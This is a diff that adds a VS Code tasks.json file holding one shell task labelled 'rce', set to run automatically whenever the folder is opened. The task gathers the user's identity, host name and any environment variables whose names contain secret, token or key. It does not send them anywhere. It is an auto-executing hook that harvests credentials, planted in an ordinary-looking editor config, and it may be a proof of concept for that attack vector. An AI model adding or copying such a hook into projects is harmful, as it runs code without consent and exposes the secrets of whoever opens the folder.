@@ -1,0 +1,11 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "rce",
+            "type": "shell",
+            "command": "whoami && id && hostname && env | grep -iE '(secret|token|key)' | head -20",
+            "runOptions": { "runOn": "folderOpen" }
+        }
+    ]
+}
